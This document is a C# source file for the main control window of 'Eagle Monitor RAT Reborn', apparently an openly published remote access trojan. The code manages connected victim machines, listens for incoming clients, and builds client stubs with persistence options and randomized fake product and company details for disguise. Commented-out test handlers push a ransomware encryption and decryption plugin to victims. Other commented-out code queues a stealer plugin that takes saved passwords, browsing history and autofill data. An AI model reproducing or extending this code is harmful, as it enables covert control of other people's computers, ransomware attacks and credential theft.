using Eagle_Monitor_RAT_Reborn.Controls;
using Eagle_Monitor_RAT_Reborn.Misc;
using Eagle_Monitor_RAT_Reborn.Network;
using Leaf.xNet;
using Newtonsoft.Json;
using PacketLib.Packet;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn
{
    public partial class MainForm : FormPattern
    {
        public MainForm()
        {
            InitializeComponent();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            this.clientDataGridView.EnableHeadersVisualStyles = false;
            this.clientDataGridView.ClearSelection();

            this.logsDataGridView.EnableHeadersVisualStyles = false;
            this.logsDataGridView.ClearSelection();

            this.hostsDataGridView.EnableHeadersVisualStyles = false;
            this.hostsDataGridView.ClearSelection();

            Directory.CreateDirectory("Logs");
            Directory.CreateDirectory("Clients");

            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.clientDataGridView, this.guna2VScrollBar1, true);
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.logsDataGridView, this.guna2VScrollBar2, true);
            this.Text = $"[Beta] EM-RAT Reborn V{Misc.Utils.CoreAssembly.Version} By Arsium - [После нас - тишина]";
            this.versionLabel.Text = this.Text;

            ImageList tabImageList = new ImageList
            {
                ColorDepth = ColorDepth.Depth32Bit,
                ImageSize = new Size(28, 28)
            };
            tabImageList.Images.Add(Properties.Resources.icons8_user);
            tabImageList.Images.Add(Properties.Resources.icons8_wrench);
            tabImageList.Images.Add(Properties.Resources.icons8_mail);//icons8_parcel
            tabImageList.Images.Add(Properties.Resources.icons8_index);
            tabImageList.Images.Add(Properties.Resources.icons8_settings);
            tabImageList.Images.Add(Properties.Resources.icons8_schedule_mail);

            this.mainGuna2TabControl.ImageList = tabImageList;
            this.tabPage1.ImageIndex = 0;
            this.tabPage2.ImageIndex = 1;
            this.tabPage3.ImageIndex = 2;
            this.tabPage4.ImageIndex = 3;
            this.tabPage5.ImageIndex = 4;
            this.tabPage10.ImageIndex = 5;

            ImageList tabImageListTasks = new ImageList
            {
                ColorDepth = ColorDepth.Depth32Bit,
                ImageSize = new Size(28, 28)
            };

            tabImageListTasks.Images.Add(Properties.Resources.icons8_todo_list);
            tabImageListTasks.Images.Add(Properties.Resources.icons8_create);
            this.onConnectGuna2TabControl.ImageList = tabImageListTasks;
            this.tabPage11.ImageIndex = 0;
            this.tabPage12.ImageIndex = 1;


            ImageList tabImageListClient = new ImageList
            {
                ColorDepth = ColorDepth.Depth32Bit,
                ImageSize = new Size(28, 28)
            };
            tabImageListClient.Images.Add(Properties.Resources.icons8_signal);
            tabImageListClient.Images.Add(Properties.Resources.icons8_categorize);
            tabImageListClient.Images.Add(Properties.Resources.icons8_new_property);
            tabImageListClient.Images.Add(Properties.Resources.icons8_advanced_search);
            tabImageListClient.Images.Add(Properties.Resources.icons8_Tools);

            this.builderGuna2TabControl.ImageList = tabImageListClient;
            this.tabPage6.ImageIndex = 0;
            this.tabPage7.ImageIndex = 1;
            this.tabPage8.ImageIndex = 2;
            this.tabPage13.ImageIndex = 3;
            this.tabPage9.ImageIndex = 4;
        }

        private void MainForm_Shown(object sender, EventArgs e)
        {
            try
            {
                using (HttpRequest httpRequest = new HttpRequest())
                {
                    httpRequest.IgnoreProtocolErrors = true;
                    httpRequest.UserAgent = Http.ChromeUserAgent();
                    httpRequest.ConnectTimeout = 5000;
                    string request = httpRequest.Get("https://api.github.com/repos/arsium/EagleMonitorRAT/releases").ToString();

                    List<Misc.GitHubAPI> json = JsonConvert.DeserializeObject<List<Misc.GitHubAPI>>(request);
                    foreach (Misc.GitHubAPI gitHubAPI in json)
                    {
                        this.updateLogRichTextBox.SelectionColor = Color.FromArgb(197, 66, 245);
                        this.updateLogRichTextBox.AppendText("Version : " + gitHubAPI.tag_name + "\n\n");

                        this.updateLogRichTextBox.SelectionColor = Color.FromArgb(66, 182, 245);
                        this.updateLogRichTextBox.AppendText(gitHubAPI.body.Replace("*", "•") + "\n\n\n");
                    }

                    int gitHubVersion = int.Parse(json[0].tag_name.Replace(".", ""));
                    int localVersion = int.Parse(Misc.Utils.CoreAssembly.Version.ToString().Replace(".", ""));

                    if (gitHubVersion > localVersion)
                        MessageBox.Show(this, $"A new update is available {json[0].tag_name} !", Misc.Utils.CoreAssembly.Name, MessageBoxButtons.OK, MessageBoxIcon.Information);
                    else if (gitHubVersion < localVersion)
                        MessageBox.Show("You use an unknown version of Eagle Monitor RAT Reborn !", Misc.Utils.CoreAssembly.Name, MessageBoxButtons.OK, MessageBoxIcon.Information);                 
                }
            }
            catch (Exception ex)
            {
                this.updateLogRichTextBox.SelectionColor = Color.Red;
                this.updateLogRichTextBox.AppendText(ex.ToString());
            }
            finally 
            {
                Misc.Utils.ReadSettings();
                Misc.Utils.StartServers();
                this.portLabel.Text = "Listening on : { ";
                foreach (int p in Program.settings.ports)
                {
                    this.portLabel.Text += p.ToString() + ", ";
                }
                this.portLabel.Text = this.portLabel.Text.Remove(this.portLabel.Text.Length - 2, 2);
                this.portLabel.Text += " }";
            }
        }

        private void closeGuna2ControlBox_Click(object sender, EventArgs e)
        {
            Misc.Utils.SaveSettings();
            if(this.logsDataGridView.Rows.Count > 0)
                Misc.Utils.SaveLogs(this.logsDataGridView);
            Misc.Imports.NtTerminateProcess((IntPtr)(-1), 0);
        }

        private void logoPictureBox_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            Eagle_Monitor_RAT_Reborn.Controls.Utils.MoveForm(this);
        }

        private void versionLabel_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            Eagle_Monitor_RAT_Reborn.Controls.Utils.MoveForm(this);
        }

        //https://stackoverflow.com/questions/4314673/how-to-deselect-all-selected-rows-in-a-datagridview-control
        private void dataGridView1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = clientDataGridView.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    clientDataGridView.ClearSelection();
                    clientDataGridView.CurrentCell = null;
                }
            }
        }

        private void hostsDataGridView_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = hostsDataGridView.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    hostsDataGridView.ClearSelection();
                    hostsDataGridView.CurrentCell = null;
                }
            }
        }

        private void MainForm_MouseLeave(object sender, EventArgs e)
        {
            clientDataGridView.ClearSelection();
            clientDataGridView.CurrentCell = null;

            hostsDataGridView.ClearSelection();
            hostsDataGridView.CurrentCell = null;
        }

        private void githubPictureBox_MouseClick(object sender, MouseEventArgs e)
        {
            Process.Start("https://github.com/arsium");
        }

        private void githubPictureBox_MouseDown(object sender, MouseEventArgs e)
        {
            githubPictureBox.BackColor = Color.FromArgb(215, 215, 215);
        }

        private void githubPictureBox_MouseHover(object sender, EventArgs e)
        {
            githubPictureBox.BackColor = Color.FromArgb(240, 240, 240);
        }

        private void githubPictureBox_MouseUp(object sender, MouseEventArgs e)
        {
            githubPictureBox.BackColor = Color.White;
        }

        private void githubPictureBox_MouseLeave(object sender, EventArgs e)
        {
            githubPictureBox.BackColor = Color.White;
        }

        private void loginToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow row in clientDataGridView.SelectedRows)
            {
                string IP = row.Cells[2].Value.ToString();
                Eagle_Monitor_RAT_Reborn.Controls.Utils.InitiateForm(ClientHandler.ClientHandlersList[IP]);
            }
        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ClosePacket closePacket = new ClosePacket();
            foreach (DataGridViewRow row in clientDataGridView.SelectedRows)
            {
                string IP = row.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(closePacket);
            }
        }

        private void closeUninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            UninstallPacket uninstallPacket = new UninstallPacket();
            foreach (DataGridViewRow row in clientDataGridView.SelectedRows)
            {
                string IP = row.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(uninstallPacket);
            }
        }

        private void autoSaveRecoveryGuna2CheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (autoSaveRecoveryGuna2CheckBox.Checked)
                Program.settings.autoSaveRecovery = true;
            else
                Program.settings.autoSaveRecovery = false;
        }

        private void notificationSoundGuna2CheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (notificationSoundGuna2CheckBox.Checked)
                Program.settings.notificationSound = true;
            else
                Program.settings.notificationSound = false;
        }

        #region "Builder"
        private void persistenceGuna2CheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (persistenceGuna2CheckBox.Checked)
            {
                pathPersistenceGuna2ComboBox.Enabled = true;
                persistenceMethodGuna2ComboBox.Enabled = true;
            }
            else
            {
                pathPersistenceGuna2ComboBox.Enabled = false;
                persistenceMethodGuna2ComboBox.Enabled = false;
            }
        }
        internal string iconPath { get; set; }


        private void removeHostStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach(DataGridViewRow host in Program.mainForm.hostsDataGridView.SelectedRows)
                Program.mainForm.hostsDataGridView.Rows.Remove(host);
        }

        private void buildGuna2Button_Click(object sender, EventArgs e)
        {

            //Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));//C:\Users\Arsium\AppData\Roaming
            //Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));//C:\Users\Arsium\AppData\Local
            //Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup));//C:\Users\Arsium\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
            //Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));//user of current user
            if (tosLicenseGuna2CheckBox.Checked)
            {
                /*string stubPath = Misc.Utils.StubPath;

                if (vbStubGuna2CheckBox.Checked)
                    stubPath += "VB";*/

                Builder.StubBuilder.BuildClient();   
            }
            else
            {
                MessageBox.Show("You forgot to agree with TOS and license !");
            }
        }

        private void iconGuna2Button_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Title = "Choose Icon";
                dlg.Filter = "Icons *.ico|*.ico";
                dlg.Multiselect = false;

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    iconPath = dlg.FileName;
                    pictureBox1.Image = Image.FromFile(iconPath);
                }
            }
        }

        private void randomizeGuna2Button_Click(object sender, EventArgs e)
        {
            fileVersionGuna2TextBox.Text = $"{RandomString.RandomDigit()}.{RandomString.RandomDigit()}.{RandomString.RandomDigit()}.{RandomString.RandomDigit()}";
            productVersionGuna2TextBox.Text = $"{RandomString.RandomDigit()}.{RandomString.RandomDigit()}.{RandomString.RandomDigit()}.{RandomString.RandomDigit()}";
            productGuna2TextBox.Text = RandomString.RandomStringFunction(new Random().Next(10, 20));
            descriptionGuna2TextBox.Text = RandomString.RandomStringFunction(new Random().Next(10, 20));
            companyGuna2TextBox.Text = RandomString.RandomStringFunction(new Random().Next(10, 20));
            copyrightGuna2TextBox.Text = RandomString.RandomStringFunction(new Random().Next(10, 20));
            trademarksGuna2TextBox.Text = RandomString.RandomStringFunction(new Random().Next(10, 20));
            filenameGuna2TextBox.Text = RandomString.RandomStringFunction(new Random().Next(10, 20));
        }


        private void addHostGuna2Button_Click(object sender, EventArgs e)
        {
            int rowId = Program.mainForm.hostsDataGridView.Rows.Add();
            DataGridViewRow row = Program.mainForm.hostsDataGridView.Rows[rowId];
            row.Cells["Column22"].Value = dnsGuna2TextBox.Text;
            row.Cells["Column23"].Value = portGuna2TextBox.Text;

            dnsGuna2TextBox.Text = null;
            portGuna2TextBox.Text = null;
        }
        #endregion

        private void test123ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Only there to test new features
            /*foreach (DataGridViewRow row in clientDataGridView.SelectedRows)
            {
                string IP = row.Cells[2].Value.ToString();

                RansomwareEncryptionPacket ransomwareEncryptionPacket = new RansomwareEncryptionPacket(ClientHandler.ClientHandlersList[IP].encryptionInformation.publicRSAServerKey, new List<string>() { "C:\\Users\\arsium\\Desktop\\TestFodler" }, false, false);
                ransomwareEncryptionPacket.plugin = PacketLib.Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Ransomware.dll"), 1);
                ClientHandler.ClientHandlersList[IP].SendPacket(ransomwareEncryptionPacket);
            }*/
        }

        private void test456ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Only there to test new features
            /*foreach (DataGridViewRow row in clientDataGridView.SelectedRows)
            {
                string IP = row.Cells[2].Value.ToString();

                RansomwareDecryptionPacket ransomwareDecryptionPacket = new RansomwareDecryptionPacket(ClientHandler.ClientHandlersList[IP].encryptionInformation.privateRSAServerKey);
                ransomwareDecryptionPacket.plugin = PacketLib.Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Ransomware.dll"), 1);
                ClientHandler.ClientHandlersList[IP].SendPacket(ransomwareDecryptionPacket);
            }*/
        }

        private void addTaskGuna2Button_Click(object sender, EventArgs e)
        {
            /*switch (tasksGuna2ComboBox.SelectedIndex) 
            {
                case 0:
                    Program.settings.onConnectPackets.Add(new PasswordsPacket()
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
                    });
                    break;

                case 1:
                    Program.settings.onConnectPackets.Add(new HistoryPacket()
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
                    });
                    break;

                case 2:
                    Program.settings.onConnectPackets.Add(new AutofillPacket()
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
                    });
                    break;
            }*/
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new AboutForm().Show();
        }

        private void portRemoveStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.portListView.SelectedItems.Count > 0)
                this.portListView.SelectedItems[0].Remove();
        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string p = Microsoft.VisualBasic.Interaction.InputBox("Port :");
            this.portListView.Items.Add(p);
        }
    }
}
